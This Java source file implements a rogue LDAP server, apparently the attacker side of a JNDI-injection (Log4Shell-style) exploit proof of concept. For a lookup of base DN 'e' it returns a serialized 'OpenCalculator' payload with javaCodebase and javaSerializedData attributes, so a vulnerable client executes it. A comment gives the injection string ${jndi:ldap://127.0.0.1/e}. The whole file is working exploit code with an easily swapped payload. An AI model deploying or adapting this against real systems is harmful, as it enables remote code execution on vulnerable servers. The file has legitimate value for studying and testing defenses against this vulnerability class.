import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import payload.OpenCalculator;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.net.InetAddress;
import java.util.logging.ConsoleHandler;


public class LDAPServer {
    private int port;

    public LDAPServer(int port)
    {
        this.port = port;
    }

    public void start()
    {
        try {
            final InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig("dc=foo,dc=bar");

            config.setListenerConfigs(new InMemoryListenerConfig("exp", InetAddress.getByName("0.0.0.0"), port, ServerSocketFactory.getDefault(), SocketFactory.getDefault(), (SSLSocketFactory) SSLSocketFactory.getDefault()));
            config.addInMemoryOperationInterceptor(new OperationInterceptor());
            config.setAccessLogHandler(new ConsoleHandler());

            final InMemoryDirectoryServer server = new InMemoryDirectoryServer(config);

            System.out.println("Starting server");

            server.startListening();
            System.out.println("Started server");
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }

    private static final class OperationInterceptor extends InMemoryOperationInterceptor {

        @Override public void processSearchResult(InMemoryInterceptedSearchResult result) {
            try {
                final String baseDn = result.getRequest().getBaseDN();

                System.out.println("Process search result for " + baseDn);

                if (baseDn.equals("e")) {
                    sendExeResult(result, new Entry(baseDn));
                }
            } catch (Exception ex) {
                ex.printStackTrace();
            }
        }

        // Works only if the system property com.sun.jndi.ldap.object.trustURLCodebase is true
        // ${jndi:ldap://127.0.0.1/e}
        private void sendExeResult(InMemoryInterceptedSearchResult result, Entry entry) throws LDAPException, IOException, ClassNotFoundException {
            final Object send = new OpenCalculator();
            final String location = LDAPServer.class.getResource("").toString();

            final ByteArrayOutputStream serializedStream = new ByteArrayOutputStream();
            final ObjectOutputStream objectStream = new ObjectOutputStream(serializedStream);
            objectStream.writeObject(send);
            serializedStream.flush();

            entry.addAttribute("javaClassName", send.getClass().getName());
            entry.addAttribute("javaCodebase", location);
            entry.addAttribute("javaSerializedData", serializedStream.toByteArray());

            result.sendSearchEntry(entry);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        }
    }
}